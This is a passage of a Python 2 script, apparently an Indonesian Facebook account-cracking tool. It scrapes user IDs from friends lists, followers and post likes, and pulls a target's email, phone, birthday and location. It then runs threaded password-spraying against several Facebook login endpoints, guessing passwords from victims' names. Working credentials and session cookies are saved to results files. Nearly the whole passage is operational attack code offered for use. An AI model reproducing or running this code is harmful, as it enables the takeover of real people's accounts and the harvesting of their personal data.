            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m [\033[0;96m%s%s\033[0m] [\033[0;91m%s%s\033[0m]Sedang Dump ID !!'%(w,datetime.now().strftime('%H:%M:%S'), w,len(id)
            )); sys.stdout.flush()
            time.sleep(1./3500)

        ys.close()
        jalan('\n\n %s[%s✓%s]Suksess Dump ID :)'%(N,H,N))
        print ' [%s•%s]Copy Filenya Ngab ==⟩ [ %s%s%s ]%s'%(O,N,M,cin,N,i)
        print 50 * '-'+N
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	jalan('\n Gagal DiDump ID Facebook !!')
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s]ID Public : '%(N,O,N))
        osjaoaosnsi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(csy,__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy, ihh, __cindy__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + nama + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m [\033[0;96m%s%s\033[0m] [\033[0;91m%s%s\033[0m]Sedang Dump ID !!'%(w,datetime.now().strftime('%H:%M:%S'), w,len(id)
            )); sys.stdout.flush()
            time.sleep(1./3500)

        ys.close()
        jalan('\n\n %s[%s✓%s]Suksess Dump ID :)'%(N,H,N))
        print ' [%s•%s]Copy Filenya Ngab ==⟩ [ %s%s%s ]%s'%(O,N,M,kntl,N,i)
        print 50 * '-'+N
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	jalan('\n Gagal DiDump ID Facebook !!')
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s]ID Followers : '%(N,O,N))
        osjaoaosnsi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(csy, __cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy, ihh, __cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + nama + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m [\033[0;96m%s%s\033[0m] [\033[0;91m%s%s\033[0m]Sedang Dump ID !!'%(w,datetime.now().strftime('%H:%M:%S'), w,len(id)
            )); sys.stdout.flush()
            time.sleep(1./3500)

        ys.close()
        jalan('\n\n %s[%s✓%s]Suksess Dump ID :)'%(N,H,N))
        print ' [%s•%s]Copy Filenya Ngab ==⟩ [ %s%s%s ]%s'%(O,N,M,ah,N,i)
        print 50 * '-'+N
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	jalan('\n Gagal DiDump ID Facebook !!')
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari postingan hehe
def postingan():
    try:
        __cindy__= open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s]Token Error !!'%(N,M,N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s]ID Post : '%(N,O,N))
        osjaoaosnsi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(csy,__cindy__))
#        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy, ihh, __cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + nama + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m [\033[0;96m%s%s\033[0m] [\033[0;91m%s%s\033[0m]Sedang Dump ID !!'%(w,datetime.now().strftime('%H:%M:%S'), w,len(id)
            )); sys.stdout.flush()
            time.sleep(1./2500)

        ys.close()
        jalan('\n\n %s[%s✓%s]Suksess Dump ID :)'%(N,H,N))
        print ' [%s•%s]Copy Filenya Ngab ==⟩ [ %s%s%s ]%s'%(O,N,M,ikeh,N,i)
        print 50 * '-'+N
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	jalan('\n Gagal DiDump ID Facebook !!')
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# cek ingfo
def cek_ingfo():
    try:
        __cindy__= open('login.txt', 'r').read()
    except (KeyError, IOError):
        print '\n %s[%s!%s]Token Error !!'%(P,M,P)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        ppk = raw_input('\n [??]ID Target : ')
#        if ppk in ('user', 'User', 'USER'):
#        	jalan('\n [%s!%s] anda akan di arahkan ke browser!'%(M,N));time.sleep(2)
#        	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
#        	cek_ingfo()
        aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ppk, __cindy__))
        x = json.loads(aww.text)
        nmaa = x['name']
    except (KeyError, IOError):
    	nmaa = '%s-%s'%(M,N)
    except: pass
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    except: pass
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    except: pass
    try:
    	user = x['username']
    except (KeyError, IOError):
    	user = '%s-%s'%(M,N)
    except: pass
    try:
    	ttll = x['birthday']
    except (KeyError, IOError):
    	ttll = '%s-%s'%(M,N)
    except: pass
    try:
    	gndr = x['gender']
    except (KeyError, IOError):
    	gndr = '%s-%s'%(M,N)
    except: pass
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%sJones%s'%(M,N)
    except: pass
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    except: pass
    try:
    	uptd = x['updated_time']
    except (KeyError, IOError):
    	uptd = '%s-%s'%(M,N)
    except: pass
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    except: pass
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    except: pass
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
        	id.append(i['id'])
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print '\n  * Ingformasi Akun Facebook *';time.sleep(0.03)
    print '\n [!]Nama Lengkap : %s'%(nmaa);time.sleep(0.03)
    print ' [!]Nama Depan   : %s'%(ndpn);time.sleep(0.03)
    print ' [!]Nama Belakang: %s'%(nmbl);time.sleep(0.03)
    print ' [!]Username Fb  : %s'%(user);time.sleep(0.03)
    print '\n  * Data-data Akun Facebook *\n';time.sleep(0.03)
    print ' [!]Gmail Facebook : %s'%(emai);time.sleep(0.03)
    print ' [!]Nomor Telepon  : %s'%(nmrr);time.sleep(0.03)
    print ' [!]Tanggal Lahir  : %s'%(ttll);time.sleep(0.03)
    print ' [!]Jenis Kelamin  : %s'%(gndr);time.sleep(0.03)
    print ' [!]Jumblah Teman  : %s'%str(len(id));time.sleep(0.03)
    print ' [!]Total Followers: %s'%(pengikut);time.sleep(0.03)
    print ' [!]Link Facebook  : %s'%(lins);time.sleep(0.03)
    print ' [!]Status Hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    print ' [!]Tentang Status : %s'%(bioo);time.sleep(0.03)
    print ' [!]Kota Asal      : %s'%(dari);time.sleep(0.03)
    print ' [!]Tinggal Di     : %s'%(tigl);time.sleep(0.03)
    print ' [!]Zona Waktu     : %s'%(tzim);time.sleep(0.03)
    print ' [!]Terakhir DiUpdated : %s'%(uptd);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s]Suksess Mendapatkan Informasih Akun !!\n\n'%(O,N));time.sleep(0.03)
    kntl2()
def kntl2():
	raw_input(i+"BACK")
	menu()
# cek ingfo sc
#Di Recoder Rosky
def info_tools():
    os.system('clear')
    print logo
    print(i+"")
    print 25 * "--"
    jalan(i+"Akun Sosial Admin :)")
    jalan(((q+"""
Cheanel YouTube : Dumai-991
Facebook        : m.facebook.com/llovexnxx
WhatsApp        : 6283143565470
WhatsApp Grup	: Ada Tapi Malas Copynya :V
Github		: github.com/Dumai-991
Github Team	: github.com/Dumai-200""")));time.sleep(0.3)
    print 25 * "--"+"\n"
    jalan(i+"Donasi Ngab :)")
    jalan(q+"""Dana : 083143565470
Gopay: 083143565470
Ovo  : 083143565470
Pulsa: 083143565470

Baca Aja Engga Donasi :p
Cuma Lihat KaGa Donasi :b""")
    print 25 * "--"+"\n"
    jalan(i+"Informations Script")
    jalan(q+"""Script By : Mr.Risky
Script By : Yayan
Script By : Angga
Script By : Dapunta
#Tinggal Pakai Aja Susah ;)

DiUpdate : 8 - Juni - 2021""")
    raw_input('\n[ %sKEMBALI%s ] '%(O,N))
    moch_yayan()
### ganti user agent
def seting_yntkts():
	print '\n (%s1%s) ganti user agent'%(O,N)
	print ' (%s2%s) check user agent'%(O,N)
	ya_tanya_bapa_jangan_tanya_saya()
def ya_tanya_bapa_jangan_tanya_saya():
	ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
	if ytbjts == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	elif ytbjts =='1':
		yo_ndak_tau_ko_tanya_saia()
	elif ytbjts =='2':
		check_yntkts()
	else:
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():	
	os.system('rm -rf ua.txt')
	print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
	print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
	ua = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
	if ua == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	try:
		uas = open('ua.txt','w')
		uas.write(ua)
		uas.close()
		time.sleep(2)
		jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
		time.sleep(2)
		moch_yayan()
	except (KeyError, IOError):
	  print '\n %s[%s×%s]Kalau Kosong Engga Ada Hasil Cracj \n#LuAnakEngtot'%(N,M,N)
	  time.sleep(2)
	  moch_yayan()
# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('ua.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s]User Agent : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N))
    moch_yayan()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [%s?%s]Nama File : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s]Total Dump --> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] Engga Ada DiSimpan !!'%(N,M,N,M,self.apk,N)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s]Password Manual Atau Otomatis [m/O]: '%(O,N))
        if ___yayanganteng___ in ('M', 'm'):
	    jalan(p+"Masukan Passwordnya Contoh :"+i+"[ "+c+"sayang,kontol,anjing,123456,memek "+i+"]")
            while True:
                pwek = raw_input('\r\n [#]%s Masukan Passwordnya : '%(N))
                print ' [#] Password DiGunakan-> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    self.slurr()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [#]Method: ')
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
#                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
#                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print '\n [ Method Yang Tersedia !! ]\n'
                    print ' [%s1%s]Method API ( FAST )'%(O,N)
                    print ' [%s2%s]Method mbasic ( SLOW )'%(O,N)
                    print ' [%s3%s]Method ( SUPER SLOW )'%(O,N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('O', 'o'):
            print '\n [ Method Yang Tersedia !! ]\n'
            print ' [%s1%s]Method API ( FAST )'%(O,N)
            print ' [%s2%s]Method mbasic ( SLOW )'%(O,N)
            print ' [%s3%s]Method ( SUPER SLOW )'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s]Babi Lu... Pilih Y/t'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
        global ok,cp,ttl,loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        print '\r [%s%s%s]Cracking  %s/%s [ %sOK-:%s%s ] - [ %sCP-:%s%s ]'%(w,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),w,len(ok),p,w,len(cp),p),
        sys.stdout.flush()				
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* OK--> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [OK] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    __cindy__ = open('login.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* CP--> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [CP] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,ttl,loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        print '\r [%s%s%s]Cracking  %s/%s [ %sOK-:%s%s ] - [ %sCP-:%s%s ]'%(w,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),w,len(ok),p,w,len(cp),p),
#        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* OK--> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [OK] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            if 'checkpoint' in xo:
                try:
                    __cindy__ = open('login.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* CP--> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [CP] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mfb__(self, user, _yan_):
        global ok,cp,ttl,loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
        print '\r [%s%s%s]Cracking  %s/%s [ %sOK-:%s%s ] - [ %sCP-:%s%s ]'%(w,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),w,len(ok),p,w,len(cp),p),
#        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
            ses.headers=headers_
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* OK--> %s|%s|%s%s' % (H,user,pw,kuki,N)
                wrt = ' [OK] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	try:
                    __cindy__ = open('login.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* CP--> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [CP] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [*]Method : ')
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
#            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
#            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print '\n [%s+%s]Hasil Crack OK Dispam Di -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s]Hasil Crack CP DiSimpan Di -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s]Hidupkan Mode Pesawat Jika Mau Jeda/Pause Crack :)'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
